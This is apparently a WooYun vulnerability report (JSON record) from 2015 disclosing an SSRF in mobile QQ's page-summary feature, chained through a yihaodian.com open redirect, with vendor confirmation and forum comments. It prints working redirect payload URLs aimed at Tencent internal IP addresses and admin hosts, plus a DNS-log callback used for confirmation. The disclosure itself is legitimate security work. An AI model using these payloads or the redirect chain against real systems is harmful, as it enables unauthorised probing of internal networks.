{"id": 13967, "wybug_id": "wooyun-2015-0119017", "wybug_title": "腾讯移动端某功能SSRF可探/漫游内网（cloudeye神器案例）", "wybug_corp": "腾讯", "wybug_author": "lijiejie", "wybug_date": "2015-06-08 15:43", "wybug_open_date": "2015-07-23 18:10", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-23：\t细节向公众公开  简要描述： 腾讯某功能SSRF可探内网 详细说明：  手机QQ上生成 “网页概要” 的功能过滤不全面，可探测腾讯内网。漏洞利用了一号店的一个任意url跳转：\nhttp://tms2.yihaodian.com/system/login_login.action?redirect:http://admin.soso.com\n本报告同时参考了：\nhttp://www.lijiejie.com/wp-content/uploads/2015/04/tencent.com_.txt WooYun: 我是如何漫游腾讯内部网络的 \n   漏洞证明：  暴力扫描子域名，发现了：\nimg.cms.tencent.com           \t10.187.10.218, 10.187.10.217\n首先试试：\nhttp://tms2.yihaodian.com/system/login_login.action?redirect:http://img.cms.tencent.com/http://3pl.yihaodian.com/system/login_login.action?redirect:http://10.187.10.218http://3pl.yihaodian.com/system/login_login.action?redirect:http://10.187.10.217\n手机QQ上的消息：\n\n如图，第二个和第三个成功了，其实我第一次测试，发现第一个也是成功的。然后请剑总用CloudEye神器检查了发起DNS请求的IP：\nhttp://tms2.yihaodian.com/system/login_login.action?redirect:http://xxx.xxxx.dnslog.info[08/Jun/2015:14:57:40 +0800] 119.147.3.188 - - xxx.xxxx.dnslog.info GET / HTTP/1.0 200 \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\"IP地址: 119.147.3.188广东省深圳市 电信\n是腾讯服务器的几率增大，但能否访问内网，还得再测试下:\nhttp://tms2.yihaodian.com/system/login_login.action?redirect:http://admin.soso.comhttp://tms2.yihaodian.com/system/login_login.action?redirect:http://10.130.14.94http://tms2.yihaodian.com/system/login_login.action?redirect:http://10.130.2.149http://tms2.yihaodian.com/system/login_login.action?redirect:http://10.130.69.227\n发现admin.soso.com和10.130.14.94的tomcat都成功了：\n\n以上可证明漏洞存在。   修复方案：  过滤   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-06-08 18:08 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-08 18:36 |    \t\t小人物Reno \t\t\t( 普通白帽子  |\t\t\t        Rank:471 漏洞数:110        | X)\t\t \n  1    \n     2015-06-08 20:41 |    \t\t茜茜公主 \t\t\t( 普通白帽子  |\t\t\t        Rank:2360 漏洞数:406        | 家里二宝出生，这几个月忙着把屎把尿...忒...)\t\t \n  cloudeye这一宣传会不会卖的很火    \n     2015-06-08 21:09 |    \t\t嗯哼！ \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 人才有点二！)\t\t \n  绝对火了，千万草泥马奔着神器来！    \n     2015-06-08 21:36 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  看神器。    \n     2015-06-08 21:36 |    \t\tDrizzle.Risk \t\t\t( 普通白帽子  |\t\t\t        Rank:255 漏洞数:19        | You have an error in your SQL syntax; ch...)\t\t \n  哪位大神给个验证码啊~~    \n     2015-06-08 21:37 |    \t\tDrizzle.Risk \t\t\t( 普通白帽子  |\t\t\t        Rank:255 漏洞数:19        | You have an error in your SQL syntax; ch...)\t\t \n  @Drizzle.Risk 邀请码！傻了    \n     2015-06-08 21:37 |    \t\t茜茜公主 \t\t\t( 普通白帽子  |\t\t\t        Rank:2360 漏洞数:406        | 家里二宝出生，这几个月忙着把屎把尿...忒...)\t\t \n  @Drizzle.Risk 集市里不是有卖 10WB    \n     2015-06-08 21:40 |    \t\tDrizzle.Risk \t\t\t( 普通白帽子  |\t\t\t        Rank:255 漏洞数:19        | You have an error in your SQL syntax; ch...)\t\t \n  @茜茜公主 好吧 挺贵哦，真是神器？    \n     2015-06-08 21:59 |    \t\t茜茜公主 \t\t\t( 普通白帽子  |\t\t\t        Rank:2360 漏洞数:406        | 家里二宝出生，这几个月忙着把屎把尿...忒...)\t\t \n  @Drizzle.Risk 看使用者吧，我技术不行，玩不转    \n     2015-06-08 22:14 |    \t\tDrizzle.Risk \t\t\t( 普通白帽子  |\t\t\t        Rank:255 漏洞数:19        | You have an error in your SQL syntax; ch...)\t\t \n  @茜茜公主 那我肯定也玩不转了    \n     2015-07-23 18:50 |    \t\t零柒 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        )\t\t \n  。。我也没发现你说的这个神器用处在哪里，从头到尾这个所谓的神器就是检测了一下确定是不是腾讯的服务器？？？？    \n     2015-07-24 09:33 |    \t\t咖啡 \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:20        )\t\t \n  攒wb， 买，买，买    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}